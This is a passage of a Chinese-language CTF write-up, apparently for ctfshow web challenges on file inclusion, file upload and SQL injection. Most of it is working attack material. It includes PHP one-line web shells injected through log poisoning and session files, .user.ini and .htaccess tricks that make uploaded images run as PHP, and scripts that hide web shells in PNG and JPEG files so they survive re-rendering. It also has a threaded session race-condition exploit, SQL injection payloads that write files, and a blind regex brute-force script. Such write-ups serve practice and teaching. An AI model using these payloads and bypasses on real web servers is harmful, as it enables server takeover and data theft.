if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?ctf&#x3D;index.php<br>show&#x3D;<?php eval($_POST[1]);?><br>1&#x3D;system(‘tac &#x2F;ctfshow_fl0g_here.txt’);</p>
<h3 id="web-150"><a href="#web-150" class="headerlink" title="web-150"></a>web-150</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#过滤字符</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嗝，看到类还想利用的。。。。。。</p>
<p>在User-Agent写入<?php eval($_POST[1]);?></p>
<p>&#x2F;?isVIP&#x3D;true<br>ctf&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;1&#x3D;system(‘tac f*’);</p>
<p>session包含也可以</p>
<h3 id="web-150-plus"><a href="#web-150-plus" class="headerlink" title="web-150_plus"></a>web-150_plus</h3><p>session包含</p>
<blockquote>
<p>__autoload — 尝试加载未定义的类（本函数已自 PHP 7.2.0 起被<em>废弃</em>，并自 PHP 8.0.0 起被<em>移除</em>）</p>
<p>当我们使用class_exists对类进行判断的时候就会自动调用__autoload()函数</p>
</blockquote>
<p>只要我们能够控制$__CTFSHOW__，那么就能控制$class,那么就能控制$class()函数了。</p>
<p>有QUERY_STRING和extract函数，所以我们能够覆盖<code>$__CTFSHOW__</code>这个变量。同时因为过滤了下划线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>

<p>原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，然后对其进行类判断，就会自动调用 __autoload()函数方法，因为$<strong>CTFSHOW</strong>&#x3D;phpinfo；那么就会去加载phpinfo&#x3D;</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-151"><a href="#web-151" class="headerlink" title="web-151"></a>web-151</h3><p>最常规的前端校验</p>
<h3 id="web-153"><a href="#web-153" class="headerlink" title="web-153"></a>web-153</h3><p>.user.ini预解析</p>
<h3 id="web-154"><a href="#web-154" class="headerlink" title="web-154"></a>web-154</h3><p>和上面一样，多了php的过滤，<?= @eval($_GET['code']);?></p>
<h3 id="web-156"><a href="#web-156" class="headerlink" title="web-156"></a>web-156</h3><p>过滤[]，换成{}</p>
<h3 id="web-157"><a href="#web-157" class="headerlink" title="web-157"></a>web-157</h3><p>过滤 ;</p>
<?=system('tac ../f*')?>

<h3 id="web-159"><a href="#web-159" class="headerlink" title="web-159"></a>web-159</h3><p>过滤 ( )</p>
<?=`tac ../f*`?>
<p>或<br><?=`cat ../f*`?></p>
<h3 id="web-160"><a href="#web-160" class="headerlink" title="web-160"></a>web-160</h3><p>.user.ini：日志的包含</p>
<?=include"/var/lo"."g/nginx/access.lo"."g"?><?php system('tac ../f*');?>



<p>还是先上传.user.ini，再上传图片，图片内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;ph&quot;.&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;.&quot;hp&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>无论是什么时候，读写数据都要想想伪协议</p>
<h3 id="web-161"><a href="#web-161" class="headerlink" title="web-161"></a>web-161</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</span><br></pre></td></tr></table></figure>

<p>多加个图片头GIF89a</p>
<h3 id="web-162"><a href="#web-162" class="headerlink" title="web-162"></a>web-162</h3><p>远程文件包含</p>
<p>伪协议取反</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/122954230">https://blog.csdn.net/Kracxi/article/details/122954230</a></p>
<p>session包含条件竞争</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>.user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure>

<p>png</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;?=include&quot;/tmp/sess_daigua&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>yu22x师傅的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">session = requests.session()            //用requests.session()创建session对象，相当于创建了一个特定的会话，帮我们自动保持了cookie。</span><br><span class="line">sess = &#x27;daigua&#x27;</span><br><span class="line">url1 = &quot;http://52387704-c15c-4576-a4f1-923494c38ba2.challenge.ctf.show/&quot;</span><br><span class="line">url2 = &quot;http://52387704-c15c-4576-a4f1-923494c38ba2.challenge.ctf.show/upload&quot;</span><br><span class="line">data1 = &#123;</span><br><span class="line">	&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">	&#x27;file&#x27;: &#x27;daigua&#x27;                        //指定写入的文件路径为/tmp/sess_daigua</span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">	&#x27;PHPSESSID&#x27;: sess                       //指定session文件存储的路径是/tmp/sess_daigua</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.get(url2)                 //下次请求时，直接用到session,session.get获取，session.pop清除</span><br><span class="line">		if &#x27;flag&#x27; in r.text:</span><br><span class="line">			print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),      //多线程</span><br><span class="line">		   threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>

<h3 id="web-163"><a href="#web-163" class="headerlink" title="web-163"></a>web-163</h3><p>…….png一上传就被删了，条件竞争被环境限制死了。这摆明了是让用vps包含。没vps，就这样。</p>
<h3 id="web-164"><a href="#web-164" class="headerlink" title="web-164"></a>web-164</h3><p>绕过png的二次渲染，我们直接修改图片，在里面写马，用脚本防止渲染。上传之后传参下载即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;1.png&#x27;);  //要修改的图片的路径</span><br><span class="line">/* 木马内容</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-165"><a href="#web-165" class="headerlink" title="web-165"></a>web-165</h3><p>CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)</p>
<p>响应返回这个，就是用了二次渲染，我们下载二次渲染的图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line">    */</span><br><span class="line"> </span><br><span class="line">    $miniPayload = &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"> </span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"> </span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"> </span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"> </span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用脚本跑完，重新上传，访问，去burp重放，找flag。</p>
<h3 id="web-166"><a href="#web-166" class="headerlink" title="web-166"></a>web-166</h3><p>查看源代码发现只能上传zip，在正常的zip后面加一句话<br>然后直接文件包含就可以了</p>
<h3 id="web-167"><a href="#web-167" class="headerlink" title="web-167"></a>web-167</h3><p>.htaccess文件，直接用php解析jpg文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;123.png&quot;&gt;</span><br><span class="line">        SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//AddType application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure>

<h3 id="web-168"><a href="#web-168" class="headerlink" title="web-168"></a>web-168</h3><p>直接上传正常png，在末尾加一句话，修改名称为php，上传即可。也可以用蚁剑生成的免杀。</p>
<h3 id="web-169"><a href="#web-169" class="headerlink" title="web-169"></a>web-169</h3><p>日志包含，上传zip，Content-Ty改为image&#x2F;png，然后改名.user.ini。</p>
<p>接下来上传php文件就行。</p>
<p>最常规的文件上传。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>上面的内容不是很全，可以参考一下《CTFer从0到1》</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>说明：SQL注入章节只给出非常规题的WP。Sqli-labs的题都比较常规，可自行百度。</p>
<h3 id="web-174"><a href="#web-174" class="headerlink" title="web-174"></a>web-174</h3><p>要求返回结果不能有数字，但可以把数字用replace()来把数字改成其他的东西，或者直接把返回结果打印到一个文件中，这次采用了替换的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;numa&#x27;),&#x27;2&#x27;,&#x27;numb&#x27;),&#x27;3&#x27;,&#x27;numc&#x27;),&#x27;4&#x27;,&#x27;numd&#x27;),&#x27;5&#x27;,&#x27;nume&#x27;),&#x27;6&#x27;,&#x27;numf&#x27;),&#x27;7&#x27;,&#x27;numg&#x27;),&#x27;8&#x27;,&#x27;numh&#x27;),&#x27;9&#x27;,&#x27;numi&#x27;),&#x27;0&#x27;,&#x27;numj&#x27;),&#x27;a&#x27; from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web-175"><a href="#web-175" class="headerlink" title="web-175"></a>web-175</h3><p>网页的返回结果不能有任何字符，可以通过上题的另一种方法，把数据写入到一个文件中</p>
<p>内容 into outfile ‘文件名’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select username,password from ctfshow_user5 where username =&#x27;flag&#x27; into outfile &#x27;/var/www/html/1.txt&#x27;--+</span><br></pre></td></tr></table></figure>

<h3 id="web-180"><a href="#web-180" class="headerlink" title="web-180"></a>web-180</h3><p>空白字符：%09,%0a,%0b,<em>%0c</em>,%0d,%20,%a0</p>
<p>单引号也可以闭合</p>
<h3 id="web-183"><a href="#web-183" class="headerlink" title="web-183"></a>web-183</h3><p>regexp运算符，是正则表达式（regular expression）的缩写，正则表达式在搜索字符串时非常强大，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://56b6b2c0-66ee-458a-9693-bf7fe2a97be2.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">flagstr=&quot;&#125;&#123;-1234567890zxcasdqwertyfghvbnuiojklmZXCVBNMASDFGHJKLQWERTYUIOP&quot;</span><br><span class="line">flag=&#x27;ctfshow&#x27;</span><br><span class="line">while 1:</span><br><span class="line">    for i in flagstr:</span><br><span class="line">        payload=&#123;&quot;tableName&quot;:&quot;(ctfshow_user)where(pass)regexp(&#x27;&quot;+flag+i+&quot;&#x27;)&quot;&#125;</span><br><span class="line">        r=requests.post(url,payload)</span><br><span class="line">        if &quot;$user_count = 1;&quot; in r.text:</span><br><span class="line">            flag=flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    if &#x27;&#125;&#x27;in flag:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

